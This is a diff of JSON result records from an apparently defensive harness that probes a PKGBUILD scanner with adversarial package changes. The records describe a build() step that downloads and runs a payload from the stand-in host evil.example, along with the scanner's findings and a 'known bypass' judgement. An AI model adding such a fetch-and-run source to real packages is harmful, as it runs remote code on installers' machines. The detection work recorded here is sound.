@@ -1,25 +1,25 @@
 {
-  "attempt": 0,
+  "attempt": 4,
   "cost": {},
   "db_hash": "sha256:5c9dec1886cc01f5f2307ee1ea87f9b32a4cef0f8f9a2c68beebc558013bedab",
-  "diff_sha256": "sha256:9ba5fde582dfb1c71e0d55db0c52df80c604027d645c5cf73d5bcdf689038526",
+  "diff_sha256": "sha256:893dfcedfb6d61a89a1f251ab51a508d120fa46a1cdbcae100a2411955483476",
   "environment_ref": "campaign.yml#environment",
   "generator": {
-    "directory": "campaigns/rscript-solo/manual",
-    "inputs": 1,
+    "directory": "campaigns/adversarial-probes/manual",
+    "inputs": 18,
     "type": "manual"
   },
   "judge": {
     "catching_rules": [],
     "coverage_gaps": [],
     "fatal": false,
-    "rationale": "score 45 > threshold 20 (known bypass from rscript-solo; closed)",
+    "rationale": "score 45 > threshold 20 (known bypass from node-solo; closed)",
     "verdict": "known_bypass_match"
   },
   "stages": {
     "_text_source": "generator",
     "behavior": {
-      "chain": "source= -> Rscript \"$srcdir/payload.R\"",
+      "chain": "source= -> node \"$srcdir/payload.js\"",
       "preserved": true,
       "reason": "",
       "validator_version": "sha256:368bb45c32cc6123445b114f08f7e3b11774bd130049ec160f3ebbcc966b6025"
@@ -58,10 +58,10 @@
       "file_changes": [],
       "findings": [
         {
-          "description": "Downloaded Source File Executed: build() executes declared source file payload.R [H083]",
+          "description": "Downloaded Source File Executed: build() executes declared source file payload.js [H083]",
           "evidence": {
-            "match": "build() executes declared source file payload.R",
-            "path": "payload.R",
+            "match": "build() executes declared source file payload.js",
+            "path": "payload.js",
             "position": "build"
           },
           "file": "PKGBUILD",
@@ -71,7 +71,7 @@
           "template": "Downloaded Source File Executed: {match}"
         },
         {
-          "description": "Source URL classified as unknown (https://evil.example/payload.R) [SOURCE_BUCKET]",
+          "description": "Source URL classified as unknown (https://evil.example/payload.js) [SOURCE_BUCKET]",
           "evidence": {},
           "file": "",
           "line": null,
@@ -100,17 +100,17 @@
       "score_breakdown": [
         {
           "evidence": {
-            "added": "['https://evil.example/payload.R', 'https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz']",
-            "match": "URLs changed: ['https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz'] -> ['https://evil.example/payload.R', 'https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz']",
+            "added": "['https://evil.example/payload.js', 'https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz']",
+            "match": "URLs changed: ['https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz'] -> ['https://evil.example/payload.js', 'https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz']",
             "removed": "['https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz']"
           },
           "file": "PKGBUILD",
           "line": 14,
           "params": {
-            "added": "['https://evil.example/payload.R', 'https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz']",
+            "added": "['https://evil.example/payload.js', 'https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz']",
             "removed": "['https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz']"
           },
-          "reason": "Source URL Changed Without Version Bump: URLs changed: ['https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz'] -> ['https://evil.example/payload.R', 'https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz']",
+          "reason": "Source URL Changed Without Version Bump: URLs changed: ['https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz'] -> ['https://evil.example/payload.js', 'https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz']",
           "rule_id": "C003",
           "severity": "INFO",
           "template": "source URLs changed without version bump",
@@ -134,17 +134,17 @@
         },
         {
           "evidence": {
-            "match": "build() executes declared source file payload.R",
-            "path": "payload.R",
+            "match": "build() executes declared source file payload.js",
+            "path": "payload.js",
             "position": "build"
           },
           "file": "PKGBUILD",
           "line": 22,
           "params": {
-            "path": "payload.R",
+            "path": "payload.js",
             "position": "build"
           },
-          "reason": "Downloaded Source File Executed: build() executes declared source file payload.R",
+          "reason": "Downloaded Source File Executed: build() executes declared source file payload.js",
           "rule_id": "H083",
           "severity": "HIGH",
           "template": "Downloaded Source File Executed: {match}",
@@ -186,7 +186,7 @@
           "file": "",
           "line": null,
           "params": {},
-          "reason": "Source URL classified as unknown (https://evil.example/payload.R)",
+          "reason": "Source URL classified as unknown (https://evil.example/payload.js)",
           "rule_id": "SOURCE_BUCKET",
           "severity": "MEDIUM",
           "template": "",
@@ -231,9 +231,9 @@
         }
       ],
       "suppressed_rules": [],
-      "verdict": "This analysis was incomplete: the repository file manifest was unavailable, so only the PKGBUILD was examined. The result describes what was examined, not the whole change. Version bump. added 2 source URL(s). Signals: Downloaded Source File Executed: build() executes declared source file payload.R [H083]; Source URL classified as unknown (https://evil.example/payload.R) [SOURCE_BUCKET]. Review the diff before building.",
+      "verdict": "This analysis was incomplete: the repository file manifest was unavailable, so only the PKGBUILD was examined. The result describes what was examined, not the whole change. Version bump. added 2 source URL(s). Signals: Downloaded Source File Executed: build() executes declared source file payload.js [H083]; Source URL classified as unknown (https://evil.example/payload.js) [SOURCE_BUCKET]. Review the diff before building.",
       "version_comparison": ""
     },
-    "wall_clock_ms": 1740
+    "wall_clock_ms": 1494
   }
 }
